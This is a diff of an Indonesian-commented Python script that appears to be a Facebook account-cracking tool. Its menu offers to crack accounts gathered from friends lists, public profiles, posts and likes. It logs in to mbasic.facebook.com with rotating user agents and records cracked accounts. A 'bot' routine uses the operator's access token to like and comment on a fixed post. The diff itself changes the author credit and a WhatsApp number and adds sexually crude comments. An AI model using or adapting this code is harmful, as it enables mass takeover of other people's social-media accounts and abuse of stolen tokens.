@@ -1,3 +1,7 @@
+#CODING BY UTF-8
+#AlpinCompiler
+#Ngerip Sc Ini Gw Buat Mati
+
 import os, sys, time, re, json, requests, bs4, random, calendar, datetime,subprocess, logging
 from concurrent.futures import ThreadPoolExecutor as khamdihiXD
 from datetime import datetime
@@ -18,16 +22,16 @@ bulan = bulan_[nTemp]
 tahun = current.year
 bullan = current.month
 bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
-
-P = '\x1b[1;97m'
-M = '\x1b[1;91m'
-H = '\x1b[1;92m'
-K = '\x1b[1;93m'
-B = '\x1b[1;94m'
-U = '\x1b[1;95m'
-O = '\x1b[1;96m'
-N = '\x1b[0m'
-J = '\033[38;2;255;127;0;1m'
+## Warna pepek cewek semok :v
+P = '\x1b[1;97m' # PUTIH
+M = '\x1b[1;91m' # MERAH
+H = '\x1b[1;92m' # HIJAU
+K = '\x1b[1;93m' # KUNING
+B = '\x1b[1;94m' # BIRU
+U = '\x1b[1;95m' # UNGU
+O = '\x1b[1;96m' # BIRU MUDA
+N = '\x1b[0m'    # WARNA YANG UDAH GAK PERAWAN :V
+J = '\033[38;2;255;127;0;1m' # ORANGE
 komen = random.choice(['Mantap bang @[100006414900732:0] I Love You','Pengguna script ganja kamu bang @[100006414900732:0]','Kamu ganteng banget deh @[100006414900732:0]','Kamu ganteng banget deh bang @[100006414900732:0]','Kamu manis bang bang @[100056394630237:0]','Kamu cantik banget anak siapa @[100062167515808:0]','Kamu ganteng banget bang @[100076440339167:0]','Mantap bang love you','Khamdihi nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100000626195514:0]'])
 user, mi, status_foll, cr, ok, cp, id, user, loop, looping = [], [], [], [], [], [], [], [], 0, 1
 ta = current.year
@@ -36,24 +40,24 @@ ha = current.day
 op = bulan_[nTemp]
 waktu = '%s-%s-%s'%(ha,op,ta)
 waktu.split('/')
-
+## NAMPUNG KANG REKODE MASE
 id = []
 ok = []
 cp = []
 loop = 0
 
-
+## USER-AGENT ORI BAWAN
 try:
 	user = ('Mozilla/5.0 (Linux; Android 9; Infinix X653C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36;]')
 	open('user.txt','w').write(user)
 except:
 	pass
-
+## RANDOM UA
 try:ugen = open('user.txt','r').read().splitlines()
 except:ugen = ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
 try:ugen2 = open('user2.txt','r').read().splitlines()
 except:ugen2 = ['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36']
-
+## MLAKU
 def jalan(kontol):
 	for wibu in kontol + "\n":
 		sys.stdout.write(wibu)
@@ -71,9 +75,9 @@ _______  ______ _______ _______ _     _ _______  ______
 |       |_____/ |_____| |       |____/  |______ |_____/
 |_____  |    \_ |     | |_____  |    \_ |______ |    \_
 ───────────────────────────────────────────────────────
- [\x1b[1;91m★%s] Author       : Mr.crack
- [\x1b[1;94m★%s] Github       : https://github.com/Clayxxx
- [\x1b[1;96m★%s] Facebook     : bocil hengker
+ [\x1b[1;91m★] Author       : Nauval.Gian</>%s
+ [\x1b[1;94m★] Github       : https://github.com/Clayxxx%s
+ [\x1b[1;96m★] Facebook     : bocil hengker%s
 ───────────────────────────────────────────────────────\n'''%(N,N,N,N))
 
 class login:
@@ -103,7 +107,7 @@ class login:
 		else:
 			login().__login__()
 	def bot(self):
-		
+		# HARGAI SEDIKIT AJA JANGAN GANTI BOT FOLOW NYA CUKUP TAMBAHKAN, TERIMA KASIH BUAT YG PENGERTIAN :V
 		try:
 			toket = open('token.x','r').read()
 		except IOError:
@@ -115,7 +119,7 @@ class login:
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
-		os.system('xdg-open wa.me/6285772148224')
+		os.system('xdg-open wa.me/6282175721016')
 		menu().main()
 
 class menu:
@@ -145,7 +149,7 @@ class menu:
 		print(' %s[%s★%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
 		print(' %s'%(N))
 		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
-		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
+		print(' %s[%s❶%s] crack dari akun publik'%(N,O,N))
 		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
 		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
 		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
@@ -243,7 +247,7 @@ class menu:
 				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,memek))
 				z = json.loads(r.text)
 				id = []
-				for e in z['data']: 
+				for e in z['data']: # MEMEK
 					id.append(e['id'] + '<=>' + e['name'])
 			except KeyError:
 				print(' %s[%s★%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()
@@ -488,7 +492,7 @@ def khamdihi(user, pasw):
 	mb = ("https://mbasic.facebook.com")
 	ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
 	ses = requests.Session()
-	
+	#......
 	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 	data = {}
 	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
@@ -682,7 +686,7 @@ class crack:
 				except Exception as e:os.sys.exit(e)
 				except:pass
 		exit()
-	def b_api(self,user,pwx): 
+	def b_api(self,user,pwx): # Kamu jahat :v
 		global loop,ok,cp
 		eram = random.choice([M,K,H,U,P,N])
 		nufi = random.choice([N,P,U,H,K,M])
@@ -744,7 +748,7 @@ class crack:
                         loop += 1
                         self.b_api(user,pwx)
 	def metod2(self,user,pwx):
-		global loop,ok,cp 
+		global loop,ok,cp # METOK
 		ram = random.choice([M,P,H,U,J,N,B])
 		fikA = loop*100/len(self.id)
 		nufikhaXD = '%'
@@ -875,4 +879,4 @@ if __name__ == '__main__':
    folder()
 
 
-
+# COD #
